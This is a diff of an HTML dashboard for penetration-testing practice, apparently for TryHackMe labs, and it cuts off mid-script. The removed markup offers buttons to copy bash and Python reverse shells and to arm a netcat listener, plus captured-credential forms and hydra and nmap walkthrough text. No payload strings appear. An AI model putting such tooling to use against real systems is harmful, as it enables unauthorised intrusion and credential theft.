-  .cve-card.sev-high     .cve-score { color: var(--warn); }
-  .cve-vec {
-    font-size: 10px;
-    color: var(--fg-dim);
-    font-family: ui-monospace, monospace;
-  }
-  .cve-card .cve-actions { display: flex; gap: 4px; }
-  .cve-card .cve-actions button {
-    font-size: 10px;
-    padding: 2px 8px;
-    color: var(--fg-dim);
-    border-color: var(--line-2);
-  }
-  .cve-card .cve-actions button:hover { color: var(--accent); border-color: var(--accent); }
-  .cve-card .cve-actions button.del:hover { color: var(--bad); border-color: var(--bad); }
-  .cve-body {
-    padding: 10px 12px;
-  }
-  .cve-summary {
-    color: var(--fg);
-    font-size: 12px;
-    line-height: 1.5;
-  }
-  .cve-meta {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 10px 22px;
-    margin-top: 8px;
-    padding-top: 8px;
-    border-top: 1px dotted var(--line);
-    font-size: 10px;
-    color: var(--fg-dim);
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-  }
-  .cve-meta .v { color: var(--fg); font-family: ui-monospace, monospace; text-transform: none; letter-spacing: 0; }
-  .cve-products {
-    margin-top: 8px;
-    display: flex;
-    flex-wrap: wrap;
-    gap: 4px;
-  }
-  .cve-products .chip {
-    font-size: 10px;
-    padding: 2px 6px;
-    border: 1px solid var(--line);
-    background: var(--bg-3);
-    color: var(--fg-dim);
-    font-family: ui-monospace, monospace;
-  }
-  .cve-trail {
-    margin-top: 8px;
-    padding-top: 6px;
-    border-top: 1px dotted var(--line);
-    font-size: 10px;
-    color: var(--fg-dim);
-    font-style: italic;
-  }
-  .cve-card.fresh { animation: cveflash 1.8s ease-out; }
-  @keyframes cveflash {
-    0%   { box-shadow: 0 0 0 2px var(--accent); }
-    100% { box-shadow: none; }
-  }
-  #cve-form { display: flex; flex-direction: column; gap: 8px; }
-  #cve-form label {
-    display: flex; flex-direction: column;
-    gap: 3px;
-    font-size: 10px;
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-    color: var(--fg-dim);
-  }
-  #cve-form input {
-    background: var(--bg-3);
-    border-color: var(--line);
-    color: var(--fg);
-    font-family: ui-monospace, monospace;
-    padding: 5px 8px;
-    font-size: 12px;
-    text-transform: uppercase;
-    letter-spacing: 0.06em;
-  }
-  #cve-form button {
-    padding: 8px 12px;
-    border-color: var(--accent);
-    color: var(--accent);
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    font-size: 11px;
-  }
-  #cve-form button:hover { background: var(--accent); color: var(--bg); }
-
-  /* ---------- INTEL cards ---------- */
-  .intel-group {
-    border: 1px solid var(--line);
-    background: var(--bg-2);
-    margin-bottom: 10px;
-  }
-  .intel-group-head {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    padding: 6px 10px;
-    background: var(--bg-3);
-    border-bottom: 1px solid var(--line);
-  }
-  .intel-group-head .icon {
-    font-size: 13px;
-    color: var(--accent);
-    width: 18px;
-    text-align: center;
-  }
-  .intel-group-head .lab {
-    color: var(--accent);
-    text-transform: uppercase;
-    letter-spacing: 0.2em;
-    font-size: 11px;
-    flex: 1;
-  }
-  body[data-theme="neon"] .intel-group-head .lab { text-shadow: var(--glow); }
-  .intel-group-head .ct {
-    color: var(--fg-dim);
-    font-size: 10px;
-    letter-spacing: 0.15em;
-  }
-  .intel-row {
-    display: grid;
-    grid-template-columns: 130px 1fr auto;
-    gap: 10px;
-    padding: 5px 10px;
-    border-top: 1px dotted var(--line);
-    align-items: baseline;
-    font-size: 12px;
-  }
-  .intel-row:first-of-type { border-top: none; }
-  .intel-row .k {
-    color: var(--fg-dim);
-    text-transform: uppercase;
-    letter-spacing: 0.13em;
-    font-size: 10px;
-    word-break: break-all;
-  }
-  .intel-row .v {
-    color: var(--fg);
-    word-break: break-word;
-    font-family: ui-monospace, monospace;
-  }
-  .intel-row .v.good { color: var(--good); }
-  .intel-row .v.warn { color: var(--warn); }
-  .intel-row .v.bad  { color: var(--bad); }
-  .intel-row .meta {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-end;
-    gap: 2px;
-    color: var(--fg-dim);
-    font-size: 9px;
-    letter-spacing: 0.1em;
-  }
-  .intel-row .meta button {
-    font-size: 9px;
-    padding: 1px 5px;
-    color: var(--fg-dim);
-    border-color: var(--line-2);
-    margin-left: 4px;
-  }
-  .intel-row .meta button:hover { color: var(--bad); border-color: var(--bad); }
-  .intel-row.fresh {
-    animation: intelflash 1.6s ease-out;
-  }
-  @keyframes intelflash {
-    0%   { background: rgba(92,184,216,0.25); }
-    100% { background: transparent; }
-  }
-  #intel-form { display: flex; flex-direction: column; gap: 8px; }
-  #intel-form label {
-    display: flex; flex-direction: column;
-    gap: 3px;
-    font-size: 10px;
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-    color: var(--fg-dim);
-  }
-  #intel-form input, #intel-form select, #intel-form textarea {
-    background: var(--bg-3);
-    border-color: var(--line);
-    color: var(--fg);
-    font-family: ui-monospace, monospace;
-    padding: 5px 8px;
-    font-size: 12px;
-    text-transform: none;
-    letter-spacing: normal;
-  }
-  #intel-form textarea { resize: vertical; min-height: 50px; }
-  #intel-form button {
-    padding: 8px 12px;
-    border-color: var(--accent);
-    color: var(--accent);
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    font-size: 11px;
-  }
-  #intel-form button:hover { background: var(--accent); color: var(--bg); }
-  .cred-card {
-    border: 1px solid var(--line);
-    background: var(--bg-2);
-    padding: 10px 12px;
-    margin-bottom: 8px;
-  }
-  .cred-card .cred-head {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 6px;
-  }
-  .cred-card .cred-svc {
-    color: var(--accent);
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    font-size: 11px;
-  }
-  body[data-theme="neon"] .cred-card .cred-svc { text-shadow: var(--glow); }
-  .cred-card .cred-src {
-    color: var(--fg-dim);
-    font-size: 10px;
+    animation: slide 0.22s ease-out;
   }
   .cred-row {
     display: grid;
-    grid-template-columns: 60px 1fr auto;
-    gap: 8px;
-    align-items: center;
-    padding: 3px 0;
-    font-size: 12px;
+    grid-template-columns: 70px 1fr auto;
+    gap: 10px;
+    align-items: baseline;
+    padding: 2px 0;
   }
   .cred-row .k {
     color: var(--fg-dim);
@@ -1073,1171 +196,208 @@
     font-family: ui-monospace, monospace;
     word-break: break-all;
   }
-  .cred-row .v.mono { color: var(--good); }
-  .cred-actions {
-    display: flex;
-    gap: 4px;
-  }
-  .cred-actions button {
-    font-size: 10px;
-    padding: 2px 8px;
+  .cred-row .v.pw { color: var(--good); font-weight: 600; }
+  .cred-row .copy {
+    background: transparent;
     color: var(--fg-dim);
-    border-color: var(--line-2);
+    border: 1px solid var(--line-2);
+    padding: 1px 8px;
+    font-family: inherit;
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    cursor: pointer;
   }
-  .cred-actions button:hover { color: var(--accent); border-color: var(--accent); }
-  .cred-actions button.del:hover { color: var(--bad); border-color: var(--bad); }
-  .cred-notes {
+  .cred-row .copy:hover { color: var(--accent); border-color: var(--accent); }
+  .cred-meta {
     margin-top: 6px;
     padding-top: 6px;
     border-top: 1px dotted var(--line);
-    font-size: 11px;
     color: var(--fg-dim);
-    font-style: italic;
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
   }
-  #cred-form { display: flex; flex-direction: column; gap: 8px; }
-  #cred-form label {
-    display: flex; flex-direction: column;
-    gap: 3px;
+  .cred-meta .v { color: var(--fg); text-transform: none; letter-spacing: 0; font-family: ui-monospace, monospace; }
+
+  /* nmap + directories — compact tabular rows */
+  .row {
+    display: grid;
+    gap: 12px;
+    align-items: baseline;
+    padding: 5px 8px;
+    border-bottom: 1px dotted var(--line);
+    animation: slide 0.22s ease-out;
+  }
+  .row .k {
+    color: var(--fg);
+    font-family: ui-monospace, monospace;
+    word-break: break-all;
+  }
+  .row .v   { color: var(--fg-dim); font-size: 11px; word-break: break-word; }
+  .row .v.good { color: var(--good); }
+  .row .v.warn { color: var(--accent-2); }
+  .row .v.bad  { color: var(--bad);  }
+  .row .meta {
+    color: var(--fg-dim);
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    text-align: right;
+  }
+  .nmap-row { grid-template-columns: 90px 130px 1fr auto; }
+  .nmap-row .port {
+    color: var(--good);
+    font-weight: 700;
+    font-family: ui-monospace, monospace;
+  }
+  .nmap-row .svc {
+    color: var(--accent);
+    font-family: ui-monospace, monospace;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    font-size: 11px;
+  }
+  .dirs-row { grid-template-columns: minmax(260px, 1.5fr) 110px 1fr auto; }
+  .dirs-row .size {
+    color: var(--fg-dim);
+    font-family: ui-monospace, monospace;
+    font-size: 11px;
+    text-align: right;
+  }
+  .row-head {
+    display: grid;
+    gap: 12px;
+    padding: 4px 8px;
+    color: var(--fg-dim);
     font-size: 10px;
     letter-spacing: 0.15em;
     text-transform: uppercase;
-    color: var(--fg-dim);
+    border-bottom: 1px solid var(--line-2);
+    margin-bottom: 4px;
   }
-  #cred-form input, #cred-form textarea {
-    background: var(--bg-3);
-    border-color: var(--line);
-    color: var(--fg);
-    font-family: ui-monospace, monospace;
-    padding: 5px 8px;
-    font-size: 12px;
-    text-transform: none;
-    letter-spacing: normal;
-  }
-  #cred-form textarea { resize: vertical; min-height: 50px; }
-  #cred-form button {
-    padding: 8px 12px;
-    border-color: var(--accent);
-    color: var(--accent);
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    font-size: 11px;
-  }
-  #cred-form button:hover { background: var(--accent); color: var(--bg); }
 
-  /* ---------- TOAST ---------- */
-  #toast-stack {
-    position: fixed;
-    right: 16px;
-    top: 70px;
+  #foot {
     display: flex;
-    flex-direction: column;
-    gap: 8px;
-    z-index: 10000;
-    pointer-events: none;
-  }
-  .toast {
+    align-items: center;
+    gap: 12px;
+    padding: 0 14px;
+    border-top: 1px solid var(--line);
     background: var(--bg-2);
-    border: 1px solid var(--good);
-    color: var(--good);
-    padding: 8px 14px;
-    font-size: 11px;
+    color: var(--fg-dim);
+    font-size: 10px;
     letter-spacing: 0.1em;
-    text-transform: uppercase;
-    box-shadow: var(--glow);
-    animation: slidein 0.3s ease-out;
-    max-width: 360px;
   }
-  .toast.warn { border-color: var(--warn); color: var(--warn); }
-  .toast.bad  { border-color: var(--bad);  color: var(--bad); }
-
-  /* hide stuff when in creds / intel / cves view */
-  body.view-creds #phase-strip, body.view-creds #main,
-  body.view-intel #phase-strip, body.view-intel #main,
-  body.view-cves  #phase-strip, body.view-cves  #main { display: none; }
-  body.view-creds #creds { display: grid; }
-  body.view-intel #intel { display: grid; }
-  body.view-cves  #cves  { display: grid; }
-
-  /* ---------- ESCALATION OVERLAY ---------- */
-  #esc-overlay {
-    position: fixed; inset: 0;
-    z-index: 10001;
-    display: none;
-    align-items: center;
-    justify-content: center;
-    background: radial-gradient(ellipse at center, rgba(0,0,0,0.55) 0%, rgba(0,0,0,0.85) 70%);
-    pointer-events: none;
-    overflow: hidden;
-  }
-  #esc-overlay.show { display: flex; animation: esc-fade 0.4s ease-out; }
-  #esc-overlay.root-stage { background: radial-gradient(ellipse at center, rgba(60,0,0,0.6) 0%, rgba(0,0,0,0.9) 70%); }
-  @keyframes esc-fade { from { opacity: 0; } to { opacity: 1; } }
-
-  #esc-grid {
-    position: absolute; inset: 0;
-    background:
-      linear-gradient(var(--accent) 1px, transparent 1px) 0 0 / 100% 40px,
-      linear-gradient(90deg, var(--accent) 1px, transparent 1px) 0 0 / 40px 100%;
-    opacity: 0.08;
-    animation: esc-grid-pan 4s linear infinite;
-  }
-  @keyframes esc-grid-pan {
-    from { background-position: 0 0, 0 0; }
-    to   { background-position: 0 40px, 40px 0; }
-  }
-  #esc-overlay.root-stage #esc-grid {
-    background:
-      linear-gradient(var(--bad) 1px, transparent 1px) 0 0 / 100% 40px,
-      linear-gradient(90deg, var(--bad) 1px, transparent 1px) 0 0 / 40px 100%;
-    opacity: 0.14;
-  }
-
-  #esc-rings {
-    position: absolute;
-    width: 1px; height: 1px;
-    left: 50%; top: 50%;
-  }
-  #esc-rings span {
-    position: absolute;
-    left: 50%; top: 50%;
-    width: 60px; height: 60px;
-    border: 2px solid var(--accent);
-    border-radius: 50%;
-    transform: translate(-50%, -50%);
-    opacity: 0;
-    animation: esc-ring 2.2s ease-out infinite;
-    box-shadow: 0 0 20px var(--accent);
-  }
-  #esc-rings span:nth-child(2) { animation-delay: 0.5s; }
-  #esc-rings span:nth-child(3) { animation-delay: 1.0s; }
-  #esc-overlay.root-stage #esc-rings span { border-color: var(--bad); box-shadow: 0 0 30px var(--bad); }
-  @keyframes esc-ring {
-    0%   { width: 60px;  height: 60px;  opacity: 0.9; }
-    100% { width: 1200px; height: 1200px; opacity: 0; }
-  }
-
-  #esc-card {
-    position: relative;
-    background: var(--bg);
-    border: 1px solid var(--accent);
-    padding: 28px 48px;
-    text-align: center;
-    box-shadow: 0 0 40px var(--accent), inset 0 0 20px rgba(92,184,216,0.1);
-    min-width: 460px;
-  }
-  #esc-overlay.root-stage #esc-card {
-    border-color: var(--bad);
-    box-shadow: 0 0 60px var(--bad), inset 0 0 30px rgba(194,86,86,0.15);
-    animation: esc-card-shake 0.5s ease-in-out;
-  }
-  @keyframes esc-card-shake {
-    0%,100% { transform: translateX(0); }
-    20% { transform: translateX(-6px); }
-    40% { transform: translateX(6px); }
-    60% { transform: translateX(-3px); }
-    80% { transform: translateX(3px); }
-  }
-  #esc-stage-label {
-    font-size: 11px;
-    letter-spacing: 0.4em;
-    color: var(--accent);
-    text-transform: uppercase;
-    margin-bottom: 6px;
-    text-shadow: 0 0 8px var(--accent);
-  }
-  #esc-overlay.root-stage #esc-stage-label {
-    color: var(--bad);
-    text-shadow: 0 0 8px var(--bad);
-  }
-  #esc-stage-name {
-    font-size: 56px;
-    font-weight: 700;
-    letter-spacing: 0.15em;
-    color: var(--fg);
-    margin-bottom: 24px;
-    font-family: ui-monospace, monospace;
-    text-shadow: 0 0 24px var(--accent);
-    animation: esc-name-glow 1.4s ease-in-out infinite;
-  }
-  #esc-overlay.root-stage #esc-stage-name {
-    text-shadow: 0 0 24px var(--bad), 0 0 60px var(--bad);
-    color: #ffd0d0;
-  }
-  @keyframes esc-name-glow {
-    0%,100% { text-shadow: 0 0 16px var(--accent); }
-    50%     { text-shadow: 0 0 36px var(--accent), 0 0 64px var(--accent); }
-  }
-
-  #esc-progress {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 4px;
-    margin-bottom: 18px;
-  }
-  .esc-pip {
-    flex: 0 0 auto;
-    padding: 5px 10px;
+  #theme {
+    background: transparent;
+    color: var(--fg-dim);
     border: 1px solid var(--line-2);
-    background: var(--bg-3);
-    color: var(--fg-dim);
-    font-size: 9px;
-    letter-spacing: 0.2em;
+    padding: 2px 10px;
+    font-family: inherit;
+    font-size: 10px;
+    letter-spacing: 0.15em;
     text-transform: uppercase;
-    position: relative;
-    transition: all 0.4s;
+    cursor: pointer;
   }
-  .esc-pip::after {
-    content: "▸";
-    position: absolute;
-    right: -10px;
-    top: 50%;
-    transform: translateY(-50%);
-    color: var(--line-2);
-    font-size: 11px;
-  }
-  .esc-pip:last-child::after { display: none; }
-  .esc-pip.done {
-    background: rgba(78,168,119,0.15);
-    border-color: var(--good);
-    color: var(--good);
-  }
-  .esc-pip.done::before { content: "✓ "; }
-  .esc-pip.active {
-    background: var(--accent);
-    color: var(--bg);
-    border-color: var(--accent);
-    box-shadow: 0 0 20px var(--accent);
-    animation: esc-pip-pulse 1s ease-in-out infinite;
-  }
-  #esc-overlay.root-stage .esc-pip.active {
-    background: var(--bad);
-    border-color: var(--bad);
-    box-shadow: 0 0 30px var(--bad);
-    color: #fff;
-  }
-  @keyframes esc-pip-pulse {
-    0%,100% { transform: scale(1); }
-    50%     { transform: scale(1.08); }
-  }
-
-  #esc-banner {
-    color: var(--fg-dim);
-    font-size: 11px;
-    letter-spacing: 0.2em;
-    text-transform: uppercase;
-    border-top: 1px dashed var(--line-2);
-    padding-top: 10px;
-    margin-top: 4px;
-  }
-  #esc-overlay.root-stage #esc-banner { color: var(--bad); }
-
-  /* ---------- HEARTBEAT ECG ---------- */
-  #heartbeat {
-    position: fixed;
-    right: 18px;
-    top: 14px;
-    width: 140px;
-    height: 28px;
-    border: 1px solid var(--line);
-    background: var(--bg-3);
-    z-index: 10;
-    pointer-events: none;
-    opacity: 0.85;
-  }
-  #hb-canvas { display: block; width: 100%; height: 100%; }
-
-  /* utility */
-  .hide { display: none !important; }
-  code.k {
-    font-family: ui-monospace, monospace;
-    color: var(--accent);
-    background: var(--bg-3);
-    padding: 1px 4px;
-    border: 1px solid var(--line);
-  }
+  #theme:hover { color: var(--accent); border-color: var(--accent); }
 </style>
 </head>
 <body data-theme="tactical">
 
 <div id="app">
 
-  <!-- ============== TOPBAR ============== -->
-  <div id="topbar">
-    <div id="brand"><span class="dot"></span><span class="glow-text">THM/OPS</span></div>
-
-    <div class="topcell"><span class="k">Target</span><span class="v accent" id="tb-target">—</span></div>
-    <div class="topcell"><span class="k">Elapsed</span><span class="v" id="tb-elapsed">00:00:00</span></div>
-    <div class="topcell"><span class="k">Open</span><span class="v amber" id="tb-openports">0</span></div>
-    <div class="topcell"><span class="k">Phase</span><span class="v" id="tb-phase">IDLE</span></div>
-
-    <div id="spacer"></div>
-
-    <div id="status-led"><span class="led"></span><span class="h-label" id="status-text">STANDBY</span></div>
-    <button class="btn-primary" id="btn-listener">⚡ Arm Listener :4444</button>
-  </div>
-
-  <!-- ============== TABS ============== -->
   <div id="tabs">
-    <button class="tab active" data-view="ops">Operations</button>
-    <button class="tab" data-view="intel">System Info <span class="badge" id="intel-badge">0</span></button>
-    <button class="tab" data-view="cves">CVEs <span class="badge" id="cve-badge">0</span></button>
-    <button class="tab" data-view="creds">Credentials <span class="badge" id="cred-badge">0</span></button>
-  </div>
-
-  <!-- ============== PHASE STRIP ============== -->
-  <div id="phase-strip"></div>
-
-  <!-- ============== MAIN GRID ============== -->
-  <div id="main">
-
-    <div id="telemetry" class="pane">
-      <div class="pane-head">
-        <span class="h-title glow-text">▌ Telemetry Stream</span>
-        <span class="spacer"></span>
-        <span class="h-label" id="tel-count">0 lines</span>
-        <button class="btn-ghost" id="btn-clear-tel">Clear</button>
-      </div>
-      <div class="pane-body" id="tel-body"></div>
-    </div>
-
-    <div id="row-resizer" title="Drag to resize"></div>
-
-    <div id="row2">
-
-      <div id="op" class="pane">
-        <div class="pane-head"><span class="h-title glow-text">▌ Current Operation</span></div>
-        <div class="pane-body" id="op-body">
-          <div id="op-name">STANDBY</div>
-          <div id="op-tagline">Awaiting tool signature on telemetry stream.</div>
-
-          <div class="op-section">
-            <div class="lab">Doing Now</div>
-            <p id="op-doing">Nothing yet — start a tool and the HUD will identify it automatically.</p>
-          </div>
-
-          <div class="op-section">
-            <div class="lab">Why This Matters</div>
-            <p id="op-why">Every step has a purpose. When a tool runs, this panel explains what the operator is trying to learn and why it moves the engagement forward.</p>
-          </div>
-
-          <div class="op-section">
-            <div class="lab">Watch For</div>
-            <ul id="op-watch">
-              <li>The HUD will populate this list as the tool runs.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-      <div id="svcs" class="pane">
-        <div class="pane-head">
-          <span class="h-title glow-text">▌ Discovered Services</span>
-          <span class="spacer"></span>
-          <span class="h-label" id="svc-count">0</span>
-        </div>
-        <div class="pane-body" id="svc-body">
-          <div class="h-label" style="color:var(--fg-dim); padding: 12px 0;">No open ports observed yet. Run a port scan against the target.</div>
-        </div>
-      </div>
-
-      <div id="dossier" class="pane">
-        <div class="pane-head"><span class="h-title glow-text">▌ Dossier</span></div>
-        <div class="pane-body">
-          <div class="dossier-kv">
-            <div class="k">Source</div><div class="v" id="d-source">—</div>
-            <div class="k">Started</div><div class="v" id="d-started">—</div>
-            <div class="k">Command</div><div class="v" id="d-cmd">—</div>
-          </div>
-
-          <div class="h-label" style="margin-bottom:6px;">Toolkit</div>
-          <div class="toolkit">
-            <button data-tk="listener">Arm netcat listener<span class="tag">:4444</span></button>
-            <button data-tk="bash">Copy bash reverse shell<span class="tag">BASH</span></button>
-            <button data-tk="python">Copy python PTY revshell<span class="tag">PY</span></button>
-            <button data-tk="stab">Copy TTY stabilizer<span class="tag">STTY</span></button>
-          </div>
-
-          <div class="tip">
-            <b>Tip.</b> Click any open port card to see attack vectors with the target IP and port number already substituted. Hit copy and paste straight into your shell.
-          </div>
-        </div>
-      </div>
-
+    <div id="brand"><span class="dot"></span>THM/OPS</div>
+    <button class="tab active" data-view="stream">Telemetry</button>
+    <button class="tab" data-view="nmap">Nmap <span class="badge" id="badge-nmap">0</span></button>
+    <button class="tab" data-view="dirs">Directories <span class="badge" id="badge-dirs">0</span></button>
+    <button class="tab" data-view="creds">Credentials <span class="badge" id="badge-creds">0</span></button>
+    <div id="right">
+      <span id="status">standby</span>
+      <span id="count">0 lines</span>
+      <button id="clear" title="Clear telemetry">Clear</button>
     </div>
   </div>
 
-  <!-- ============== CVES VIEW ============== -->
-  <div id="cves">
-    <div class="pane">
-      <div class="pane-head">
-        <span class="h-title glow-text">▌ CVE Watchlist</span>
-        <span class="spacer"></span>
-        <span class="h-label" id="cve-count">0 CVEs</span>
-        <button class="btn-ghost" id="btn-cve-clear">Clear</button>
-      </div>
-      <div class="pane-body" id="cve-body">
-        <div class="h-label" style="color:var(--fg-dim);">No CVEs surfaced yet. The HUD watches the telemetry for CVE-IDs and looks each one up automatically from NVD.</div>
-      </div>
-    </div>
-    <div class="pane">
-      <div class="pane-head"><span class="h-title glow-text">▌ Lookup CVE</span></div>
-      <div class="pane-body">
-        <form id="cve-form">
-          <label>CVE ID<input name="cve" placeholder="CVE-2021-3156"></label>
-          <button type="submit">+ Add &amp; Look Up</button>
-        </form>
-        <div class="tip" style="margin-top:14px;">
-          <b>Auto-detect.</b> Anything in the telemetry that matches <code class="k">CVE-YYYY-NNNN</code> is captured. Severity color: red ≥ 9.0 (critical), amber 7.0+ (high), teal 4.0+ (medium), dim &lt; 4.0 (low).
-          <br><br>
-          <b>Source.</b> Lookups go to <code class="k">services.nvd.nist.gov</code> (no API key needed). Results cached locally.
-        </div>
-      </div>
-    </div>
-  </div>
+  <div id="pane-stream" class="pane active"></div>
+  <div id="pane-nmap"   class="pane"></div>
+  <div id="pane-dirs"   class="pane"></div>
+  <div id="pane-creds"  class="pane"></div>
 
-  <!-- ============== INTEL VIEW ============== -->
-  <div id="intel">
-    <div class="pane">
-      <div class="pane-head">
-        <span class="h-title glow-text">▌ System Information</span>
-        <span class="spacer"></span>
-        <span class="h-label" id="intel-count">0 facts</span>
-        <button class="btn-ghost" id="btn-intel-clear">Clear</button>
-      </div>
-      <div class="pane-body" id="intel-body">
-        <div class="h-label" style="color:var(--fg-dim);">No intel collected yet. Run tools — anything we learn about the target gets sorted into categories here.</div>
-      </div>
-    </div>
-    <div class="pane">
-      <div class="pane-head"><span class="h-title glow-text">▌ Pin a Note</span></div>
-      <div class="pane-body">
-        <form id="intel-form">
-          <label>Category
-            <select name="category">
-              <option value="system">System</option>
-              <option value="users">User</option>
-              <option value="shares">Share / mount</option>
-              <option value="web">Web</option>
-              <option value="vulns">Vulnerability</option>
-              <option value="notes" selected>Note</option>
-            </select>
-          </label>
-          <label>Key<input name="key" placeholder="e.g. /admin, kernel, doak"></label>
-          <label>Value<textarea name="value" placeholder="What did we learn?"></textarea></label>
-          <label>Source<input name="source" placeholder="nmap / manual / hydra…"></label>
-          <button type="submit">+ Pin Intel</button>
-        </form>
-        <div class="tip" style="margin-top:14px;">
-          <b>Auto-collection.</b> The HUD watches the telemetry stream and silently pins anything that looks like target info — OS strings, usernames, shares, web tech, CVE IDs, paths. Pinned notes from this form sit alongside them.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ============== CREDS VIEW ============== -->
-  <div id="creds">
-    <div class="pane">
-      <div class="pane-head">
-        <span class="h-title glow-text">▌ Captured Credentials</span>
-        <span class="spacer"></span>
-        <span class="h-label" id="cred-count2">0</span>
-      </div>
-      <div class="pane-body" id="cred-list">
-        <div class="h-label" style="color:var(--fg-dim);">No credentials captured yet.</div>
-      </div>
-    </div>
-    <div class="pane">
-      <div class="pane-head"><span class="h-title glow-text">▌ Add Credential</span></div>
-      <div class="pane-body">
-        <form id="cred-form">
-          <label>Service<input name="service" placeholder="ssh / ftp / smb / http"></label>
-          <label>Username<input name="username" placeholder="admin"></label>
-          <label>Password<input name="password" placeholder="hunter2"></label>
-          <label>Source<input name="source" placeholder="hydra / manual / loot"></label>
-          <label>Notes<textarea name="notes" placeholder="optional"></textarea></label>
-          <button type="submit">+ Store Credential</button>
-        </form>
-      </div>
-    </div>
-  </div>
-
-  <!-- ============== FOOTER ============== -->
-  <div id="footer">
-    <button class="btn-ghost" id="btn-theme" title="Cycle theme">◐ <span id="theme-label">Tactical</span></button>
-    <span class="h-label">SRC</span>
-    <select id="log-source"><option value="">auto-detect</option></select>
-    <span id="freshness">last update —</span>
-    <a href="/">← back to mission control</a>
+  <div id="foot">
+    <button id="theme" title="Toggle light/dark">◐ <span id="theme-label">Tactical</span></button>
+    <span id="src-label">awaiting telemetry…</span>
   </div>
 
 </div>
-
-<div id="toast-stack"></div>
-
-<!-- ============== ESCALATION OVERLAY ============== -->
-<div id="esc-overlay">
-  <div id="esc-grid"></div>
-  <div id="esc-rings"><span></span><span></span><span></span></div>
-  <div id="esc-card">
-    <div id="esc-stage-label">SHELL ACQUIRED</div>
-    <div id="esc-stage-name">USER</div>
-    <div id="esc-progress">
-      <div class="esc-pip" data-pip="recon"><span>RECON</span></div>
-      <div class="esc-pip" data-pip="foothold"><span>FOOTHOLD</span></div>
-      <div class="esc-pip active" data-pip="user"><span>USER SHELL</span></div>
-      <div class="esc-pip" data-pip="enum"><span>POST-EXPL</span></div>
-      <div class="esc-pip" data-pip="root"><span>ROOT</span></div>
-    </div>
-    <div id="esc-banner"></div>
-  </div>
-</div>
-
-<!-- ============== HEARTBEAT BAR (always pulsing) ============== -->
-<div id="heartbeat"><canvas id="hb-canvas"></canvas></div>
 
 <script>
 "use strict";
 
-/* ===================================================================
-   STATE
-   =================================================================== */
+const MAX_LINES = 1000;
+
 const state = {
-  theme:        localStorage.getItem("thm-theme") || "tactical",
-  target:       "—",
-  startedAt:    null,
-  command:      "—",
-  logPath:      null,
-  logOffset:    0,
-  sessionPath:  null,
-  eventOffset:  0,
-  activeTool:   null,
-  phase:        "IDLE",
-  phaseIdx:     -1,
-  phaseStarts:  {},
-  phases:       [],
-  services:     {},
-  creds:        [],
-  view:         "ops",
-  telLines:     0,
-  lastFresh:    0,
-  liveUntil:    0,
-  arrivalsT:    [],   // timestamps (ms) of real telemetry arrivals, last 90s
+  theme:       localStorage.getItem("thm-theme") || "tactical",
+  sessionPath: null,
+  eventOffset: 0,
+  count:       0,
+  lastFresh:   0,
+  view:        "stream",
+  creds:       JSON.parse(localStorage.getItem("thm-creds") || "{}"),
+  ports:       JSON.parse(localStorage.getItem("thm-ports") || "{}"),
+  dirs:        JSON.parse(localStorage.getItem("thm-dirs")  || "{}"),
 };
 
-/* ===================================================================
-   TOOL REGISTRY — phase scripts, written in hacker voice
-   =================================================================== */
-const PHASE_SETS = {
-  nmap: {
-    verb: "MAP",
-    tagline: "Port reconnaissance — what's listening and what is it?",
-    why: "You can't attack what you can't see. Nmap is the airborne radar of a pentest: it tells you which doors are open, what's behind them, and roughly how old the locks are. Every later step depends on it being thorough.",
-    phases: [
-      { id:"init",    name:"Init",       sub:"sockets, host check",
-        doing:"Setting up raw sockets, resolving target, choosing scan mode.",
-        watch:["Permission errors (need sudo for SYN scan)","Host appearing down (try -Pn)","DNS resolution miss"] },
-      { id:"discover",name:"Discover",   sub:"is host alive?",
-        doing:"Pinging the target with ICMP / ARP / TCP probes to confirm it responds.",
-        watch:["Firewalls dropping ICMP","Host filtered","Latency spikes"] },
-      { id:"sweep",   name:"Sweep",      sub:"top ports first",
-        doing:"Knocking on the top 1000 TCP ports to find anything listening.",
-        watch:["Tarpits / honeypots","Filtered vs closed responses","Rate-limit drops"] },
-      { id:"banner",  name:"Banner",     sub:"-sV service grab",
-        doing:"Negotiating with each open port to identify the software and version.",
-        watch:["Outdated versions = known CVEs","Mismatched banners (decoys)","Custom service strings"] },
-      { id:"script",  name:"Scripts",    sub:"-sC default NSE",
-        doing:"Running the default NSE script set against open ports for free intel.",
-        watch:["SMB null sessions","Anonymous FTP","Cert details on HTTPS"] },
-      { id:"report",  name:"Report",     sub:"finalize map",
-        doing:"Compiling output. This is when the surface area is final.",
-        watch:["Total open ports","Unusual high ports","Anything in <1024 you didn't expect"] },
-    ]
-  },
-  hydra: {
-    verb: "BREAK",
-    tagline: "Online password attack — guessing until the lock opens.",
-    why: "Hydra throws credentials at a live service in parallel. Every line is a real authentication attempt against the target. The goal isn't elegance — it's finding the first valid login that lets you stop guessing and start moving.",
-    phases: [
-      { id:"load",    name:"Load",       sub:"wordlist + targets",
-        doing:"Loading the user and password lists into memory and preparing tasks.",
-        watch:["List size (millions take forever)","Encoding gotchas","Wrong protocol flag"] },
-      { id:"connect", name:"Connect",    sub:"open sockets",
-        doing:"Opening parallel connections to the target service.",
-        watch:["Connection refused","Service rate-limiting","Account lockouts"] },
-      { id:"attempt", name:"Attempt",    sub:"credentials in flight",
-        doing:"Sending login attempts in parallel — keep an eye on the STATUS lines.",
-        watch:["c/m = creds per minute","Tries remaining","Suspicious silence"] },
-      { id:"status",  name:"Status",     sub:"speed + ETA",
-        doing:"Hydra is reporting throughput. Use this to estimate when it finishes.",
